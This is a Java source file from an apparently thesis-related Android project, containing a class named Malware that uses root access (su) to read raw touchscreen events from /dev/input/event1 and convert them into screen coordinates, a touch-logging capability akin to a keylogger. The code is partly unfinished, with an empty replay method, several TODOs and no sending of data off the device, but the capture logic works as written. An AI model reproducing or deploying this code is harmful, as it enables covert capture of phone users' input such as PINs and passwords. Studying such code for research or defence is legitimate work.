package com.example.thesis;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.LinkedList;
import java.util.Queue;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable{
    private boolean running = false;

    private float widthMultiplier;
    private float heightMultiplier;




    public Malware(int screenX, int screenY) {
        int[] absoluteCoordinates = getAbsoluteCoordinates();
        float absoluteX = absoluteCoordinates[0];
        float absoluteY = absoluteCoordinates[1];

        widthMultiplier = screenX / absoluteX;
        heightMultiplier = screenY / absoluteY;
    }


    @Override
    public void run() {
        Log.i("Malware", "Starting malware!");
        running = true;
        captureTouchEvents();
    }

    public void stop() {
        // TODO: check what happens if it is already destroyed for example by an error.
        running = false;
        Log.i("Malware", "Stopping malware!");
        // getEventProcess.destroy();
        // TODO: make list of bufferedreaders and proccesses that you can turn of when stopped.
        /*
        // TODO: add closing of buffereaders etc...
            bufferedReaderInput.close();
            bufferedReaderErrors.close();
            getEventProcess.destroy();
         */
    }


    /**
     * Captures touch events and saves them as commands into the commands queue.
     * Helpful:
     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
     * https://stackoverflow.com/questions/18570962/permission-denied-on-rooted-android-phone-with-getevent
     */
    private void captureTouchEvents() {
        // Running command.
        BufferedReader bufferedReader = runRootCommand("od /dev/input/event1");

        // Reading result.
        String line;
        while (running) {
            Queue<String> event = readEvent(bufferedReader);
            Coordinates touchABSCoordinates = getCoordinates(event);
            Coordinates screenCoordinates = convertToScreenCoordinates(touchABSCoordinates);
            Log.i("Malware", "Captured touch: " + screenCoordinates);
        }
    }


    private Queue<String> readEvent(BufferedReader bufferedReader) {
        Queue<String> eventLines = new LinkedList<>();
        String endOfEvent = "000003  000071  177777  177777";
        try {
            // Reading lines.
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                if (line.contains(endOfEvent)) {
                    eventLines.add(line);
                    eventLines.add(bufferedReader.readLine());
                    break;
                }
                eventLines.add(line);
            }
        } catch (Exception error) {
            Log.e("Malware ", "Error reading the event lines: " + error.getMessage());
        }
        return eventLines;
    }


    public Coordinates getCoordinates(Queue<String> lines) {
        // TODO: add support for dragging

        // Processing input.
        int x = -1000;
        int y = -1000;
        while(!lines.isEmpty()) {
            String line = lines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                // ABS_MT_POSITION_X == 000065
                x = Integer.parseInt(lineSplit[7], 8);
            } else if (lineSplit[6].equals("000066")) {
                // ABS_MT_POSITION_Y == 000066
                y = Integer.parseInt(lineSplit[7], 8);
            } else if (x != -1000 && y != -1000) {
                Coordinates touchCoordinates = new Coordinates(x, y);
                return touchCoordinates;
            }
        }
        return null;
    }


    public Coordinates convertToScreenCoordinates(Coordinates coordinates) {
        // TODO: https://stackoverflow.com/questions/28215812/adb-shell-getevent-method-returns-twice-the-value-for-x-and-y-on-nexus-4/28217144#28217144
        int screenX = Math.round(coordinates.getX() * widthMultiplier);
        int screenY = Math.round(coordinates.getY() * heightMultiplier);
        Coordinates screenCoordinates = new Coordinates(screenX, screenY);
        return screenCoordinates;
    }


    /**
     * Turns off getEventProcess and resends all captured events.
     */
    private void sendKeyPresses() {
        // Sending key presses.
    }


    private BufferedReader runRootCommand(String command) {
        try {
            // Starting process as su.
            ProcessBuilder pb = new ProcessBuilder();
            pb.command("/system/bin/su");
            Process process = pb.start();

            // Sending the command.
            OutputStream outputStream = process.getOutputStream();
            outputStream.write((command + " \n").getBytes());
            outputStream.flush();

            // Buffered readers of outputs and error outputs.
            BufferedReader bufferedReaderInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader bufferedReaderErrors = new BufferedReader(new InputStreamReader(process.getErrorStream()));  // TODO: make it read errors aswell

            return bufferedReaderInput;
        } catch (Exception error) {
            Log.e("Malware", "Error running root command: " + error.getMessage());
        }
        return null;
    }


    private int[] getAbsoluteCoordinates() {
        try {
            BufferedReader bufferedReader = runRootCommand("getevent -il /dev/input/event1 | grep ABS_MT_POSITION");
            Pattern pattern = Pattern.compile(", max (.+), fuzz");
            int absoluteX = -1000;
            int absoluteY = -1000;

            String line;
            while ((line = bufferedReader.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    if (line.contains("ABS_MT_POSITION_X")) {
                        absoluteX = Integer.parseInt(matcher.group(1));
                    } else {
                        absoluteY = Integer.parseInt(matcher.group(1));
                        bufferedReader.close();
                        return new int[]{absoluteX, absoluteY};
                    }

                } else {
                    Log.e("Malware", "Couldn't find absolute!");  // TODO: for testing, remove later.
                }
            }
            bufferedReader.close();
            return new int[]{absoluteX, absoluteY};
        } catch (IOException error) {
            Log.e("Malware", "Error getting absolute size of screen: " + error.getMessage());
        }
        return null;
    }
}
